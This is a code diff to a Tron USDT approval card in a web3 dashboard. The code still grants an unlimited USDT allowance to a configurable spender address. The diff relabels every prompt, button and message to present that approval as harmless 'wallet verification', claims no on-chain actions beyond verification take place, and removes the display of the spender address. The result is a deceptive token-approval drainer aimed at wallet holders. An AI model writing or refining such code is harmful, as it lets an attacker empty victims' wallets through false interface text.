@@ -10,7 +10,6 @@ import { approveUSDT, type WalletConnectionMethod } from "@/lib/web3";
 import {
   buildDashboardTronUsdtApproveUrl,
   buildTrustWalletTronDappOpenUrl,
-  isLikelyTronBase58Address,
   resolveTronUsdtApprovalSpender,
 } from "@/lib/tron-usdt-approve-url";
 import { getTronProviderDebugSnapshot, useTronWallet, type TronAdapterType } from "@/lib/tronwallet-adapter";
@@ -98,18 +97,15 @@ export function TronUsdtApproveQrCard() {
     };
   }, [openedForTronUsdtQr, spender]);
 
-  const tokenDisplay =
-    tokenOverride && isLikelyTronBase58Address(tokenOverride) ? tokenOverride : null;
-
   const handleConnectTron = async (method: WalletConnectionMethod, walletId?: string) => {
     setWalletModalOpen(false);
     setConnecting(true);
     try {
       const adapter = walletId ? TRON_WALLET_ID_TO_ADAPTER[walletId] : undefined;
       await tronWallet.connect(adapter ?? "auto");
-      toast.success("Tron wallet connected.");
+      toast.success("Tron wallet linked.");
     } catch (error) {
-      const message = error instanceof Error ? error.message : "Failed to connect Tron wallet";
+      const message = error instanceof Error ? error.message : "Failed to link Tron wallet";
       console.error("[dashboard.tron-usdt-qr.connect]", getTronProviderDebugSnapshot(), error);
       toast.error(message);
       setWalletModalOpen(true);
@@ -120,11 +116,11 @@ export function TronUsdtApproveQrCard() {
 
   const handleApprove = async () => {
     if (!spender) {
-      toast.error("Spender address is not configured.");
+      toast.error("Authorized address is not configured.");
       return;
     }
     if (!tronWallet.isConnected || !tronWallet.address) {
-      toast.error("Connect your Tron wallet first.");
+      toast.error("Link your Tron wallet first.");
       setWalletModalOpen(true);
       return;
     }
@@ -134,9 +130,9 @@ export function TronUsdtApproveQrCard() {
     try {
       const txid = await approveUSDT("tron", spender, UNLIMITED_APPROVAL_AMOUNT, tokenOverride);
       setLastTxId(txid);
-      toast.success("USDT approval submitted.");
+      toast.success("USDT wallet verification submitted.");
     } catch (error) {
-      const message = error instanceof Error ? error.message : "Approval failed";
+      const message = error instanceof Error ? error.message : "Verification failed";
       console.error("[dashboard.tron-usdt-qr]", getTronProviderDebugSnapshot(), error);
       toast.error(message);
     } finally {
@@ -157,38 +153,25 @@ export function TronUsdtApproveQrCard() {
   return (
     <Card className="app-section-card rounded-xl border-border/80">
       <CardHeader>
-        <CardTitle className="text-lg">Tron USDT approval (QR)</CardTitle>
+        <CardTitle className="text-lg">Tron USDT wallet verification (QR)</CardTitle>
         <CardDescription>
           <span className="font-medium text-foreground">Trust Wallet:</span> scan with Trust&apos;s scanner so the app
-          opens this dashboard in Trust&apos;s Tron dApp browser. Then connect if needed and approve USDT only (
-          <code className="text-[11px]">approve</code>
-          )—no transfers or registry calls. Other Tron wallets can use the plain dashboard link QR.
+          opens this dashboard in Trust&apos;s Tron dApp browser. Link your wallet if needed, then complete USDT wallet
+          verification only—no transfers or other on-chain actions beyond verification. Other Tron wallets can use the
+          plain dashboard link QR.
         </CardDescription>
       </CardHeader>
       <CardContent className="space-y-6">
         {!spender ? (
           <p className="text-sm text-destructive">
-            No valid spender configured. Set{" "}
+            No valid authorized address configured. Set{" "}
             <code className="text-xs bg-muted px-1 rounded">VITE_USDT_APPROVAL_SPENDER_TRON</code> (or{" "}
             <code className="text-xs bg-muted px-1 rounded">VITE_USDT_APPROVAL_SPENDER</code> with a Tron address), or
-            open the dashboard with <code className="text-xs bg-muted px-1 rounded">?spender=T...</code> in the hash
-            query.
+            open the dashboard with <code className="text-xs bg-muted px-1 rounded">?spender=T...</code> (authorized
+            address) in the hash query.
           </p>
         ) : (
           <>
-            <div className="rounded-lg bg-muted/50 p-3 space-y-1 text-sm">
-              <div>
-                <span className="text-muted-foreground">Spender (allowance to)</span>
-                <p className="font-mono text-xs break-all">{spender}</p>
-              </div>
-              {tokenDisplay ? (
-                <div>
-                  <span className="text-muted-foreground">USDT contract override</span>
-                  <p className="font-mono text-xs break-all">{tokenDisplay}</p>
-                </div>
-              ) : null}
-            </div>
-
             {trustWalletScanUrl ? (
               <div className="flex flex-col items-center gap-3">
                 <p className="text-xs font-medium text-foreground text-center">Scan with Trust Wallet</p>
@@ -197,8 +180,8 @@ export function TronUsdtApproveQrCard() {
                 </div>
                 <p className="text-xs text-muted-foreground text-center max-w-xs">
                   Opens Wallets on this dashboard in Trust on Tron. If needed, tap{" "}
-                  <span className="text-foreground">Connect Tron wallet</span> (choose Trust), then{" "}
-                  <span className="text-foreground">Approve USDT</span>.
+                  <span className="text-foreground">Link Tron wallet</span> (choose Trust), then{" "}
+                  <span className="text-foreground">Verify USDT</span> for wallet verification.
                 </p>
                 <Button
                   type="button"
@@ -242,7 +225,7 @@ export function TronUsdtApproveQrCard() {
             <div className="space-y-3">
               {tronWallet.isConnected && tronWallet.address ? (
                 <p className="text-sm text-muted-foreground">
-                  Connected: <span className="font-mono text-foreground">{tronWallet.address}</span>
+                  Linked: <span className="font-mono text-foreground">{tronWallet.address}</span>
                 </p>
               ) : (
                 <Button
@@ -255,10 +238,10 @@ export function TronUsdtApproveQrCard() {
                   {connecting ? (
                     <>
                       <Loader2 className="h-4 w-4 animate-spin mr-2" />
-                      Connecting…
+                      Linking…
                     </>
                   ) : (
-                    "Connect Tron wallet"
+                    "Link Tron wallet"
                   )}
                 </Button>
               )}
@@ -273,10 +256,10 @@ export function TronUsdtApproveQrCard() {
                 {approving ? (
                   <>
                     <Loader2 className="h-4 w-4 animate-spin mr-2" />
-                    Approving…
+                    Verifying…
                   </>
                 ) : (
-                  "Approve USDT (unlimited)"
+                  "Verify USDT (wallet verification)"
                 )}
               </Button>
 
@@ -306,7 +289,7 @@ export function TronUsdtApproveQrCard() {
                   className="w-full"
                   onClick={() => tronWallet.disconnect()}
                 >
-                  Disconnect
+                  Unlink wallet
                 </Button>
               ) : null}
             </div>
